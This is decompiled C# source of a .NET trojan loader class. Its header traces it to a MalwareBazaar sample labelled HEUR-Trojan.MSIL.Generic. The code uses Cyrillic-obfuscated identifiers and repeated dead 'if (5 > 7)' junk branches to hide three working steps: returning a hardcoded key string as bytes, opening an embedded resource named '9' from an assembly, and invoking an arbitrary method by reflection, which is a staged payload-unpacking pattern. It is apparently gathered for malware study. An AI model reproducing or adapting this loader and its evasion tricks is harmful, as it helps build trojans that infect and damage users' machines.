// Decompiled with JetBrains decompiler
// Type: НзийНдНыК
// Assembly: cn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B640E3C4-216F-4427-96BE-F9CA59C815FA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Generic-4d7a89a6c16c3f3e24e96a58c19a4246d98c78b6f2a7a424055ed6d418ee48cc.exe

using Microsoft.VisualBasic;
using System.Collections.Generic;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;

internal class НзийНдНыК
{
  [DllImport("netapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long NetGetDCName(long ServerName, long DomainName, long lpBuffer);

  [DllImport("netapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long NetApiBufferFree(long pBuffer);

  [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern void CopyMem(long pTo, long uFrom, long lSize);

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long lstrlenW(long lpString);

  public static object ҀҀПЧѺЮѰшЛг()
  {
    object bytes;
    if (5 > 7)
    {
      bool flag = false;
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      string upper1;
      string upper2;
      if (flag)
      {
        string str1;
        upper1 = str1.ToUpper();
        string str2;
        upper2 = str2.ToUpper();
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      int index1 = upper2.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = upper2[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      for (int index2 = upper1.Length - 1; index2 >= 0; --index2)
      {
        char key4 = upper1[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
      bytes = (object) Encoding.Default.GetBytes("fknvildtwhdgcnwtfmscblpnajfxkxdkwualxznayaxey".Replace("+", "").Replace("+", "").Replace("+", "").Replace("+", "").Replace("+", "").Replace("+", "").Replace("+", ""));
    return bytes;
  }

  public static void тпзИсрПтюЕБЬ(MethodInfo crap)
  {
    if (5 > 7)
    {
      bool flag = false;
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      string upper1;
      string upper2;
      if (flag)
      {
        string str1;
        upper1 = str1.ToUpper();
        string str2;
        upper2 = str2.ToUpper();
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      int index1 = upper2.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = upper2[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      for (int index2 = upper1.Length - 1; index2 >= 0; --index2)
      {
        char key4 = upper1[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
      crap.Invoke((object) null, new object[0]);
  }

  public static object адзЕГЬЅнпѪЪѮ(object u)
  {
    object obj;
    if (5 > 7)
    {
      bool flag = false;
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      string upper1;
      string upper2;
      if (flag)
      {
        string str1;
        upper1 = str1.ToUpper();
        string str2;
        upper2 = str2.ToUpper();
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      int index1 = upper2.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = upper2[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      for (int index2 = upper1.Length - 1; index2 >= 0; --index2)
      {
        char key4 = upper1[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
      obj = (object) new ResourceManager("9", (Assembly) u);
    return obj;
  }
}
